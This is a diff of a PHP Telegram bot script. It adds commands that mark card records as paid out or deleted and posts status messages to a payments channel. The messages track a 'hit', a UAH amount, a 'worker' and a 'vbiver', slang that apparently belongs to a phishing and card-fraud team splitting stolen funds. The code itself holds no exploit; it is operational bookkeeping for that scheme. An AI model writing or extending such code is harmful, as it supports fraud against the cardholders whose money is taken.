@@ -1209,6 +1209,40 @@ file_put_contents('./log.txt',$urlApi.$key.'/sendMessage?'.http_build_query($dat
             ];   
             file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
         }
+        
+        if(strpos($post->message->text,'/deleteviplta_')!==false){
+            $check = explode("_",$post->message->text); 
+            
+            $con->user->update_card($check[1],array('status_viplat'=>1)); 
+             
+        }
+        if(strpos($post->message->text,'/successviplta_')!==false){
+            $check = explode("_",$post->message->text); 
+            
+            $con->user->update_card($check[1],array('status_viplat'=>2)); 
+        }
+        if(strpos($post->message->text,'/successviplta_')!==false||strpos($post->message->text,'/deleteviplta_')!==false){
+            $check = explode("_",$post->message->text);
+            $card = $con->user->get_card($check[1]);
+            $product = (object)$con->products->get_product($card->pid); 
+            $worker = (object)$con->user->get_user_byid($product->uid); 
+ 
+            $data = [
+                'chat_id' => $card->vbid,  
+                'parse_mode'=>'HTML',
+                'message_id'=>$post->message->message_id,
+                'text' => "💸 <b>Залет</b>: #".$card->id."\n <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n👨‍💻 <b>Воркер</b>: @".$worker->login."\n🦹‍♂️ <b>Вбивер</b>: @".$card->vblogin."\n\n✅ Обработано ".($card->status_viplat==1?"[Удалено]":"[Выплачено]")."\n"
+            ];      
+            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data)); 
+            
+            
+             $data = [
+                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
+                    'parse_mode'=>'HTML',
+                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
+                ];     
+                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
+        }
 
 
         if(strpos($post->message->text,'/get_log_')!==false){
@@ -1359,7 +1393,7 @@ file_put_contents('./log.txt',$urlApi.$key.'/sendMessage?'.http_build_query($dat
                 $data = [
                     'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                     'parse_mode'=>'HTML',
-                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":"[Выплачено]")." 💵\n<b>ID</b>: ".$card->id."|\n"
+                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$summ_vbiv." UAH / ".curs($summ_vbiv,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
                 ];     
                 file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
             //}
@@ -1436,7 +1470,7 @@ file_put_contents('./log.txt',$urlApi.$key.'/sendMessage?'.http_build_query($dat
             $data = [
                 'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                 'parse_mode'=>'HTML',
-                'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":"[Выплачено]")." 💵\n<b>ID</b>: ".$card->id."|\n"
+                'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
             ];     
             file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
         }
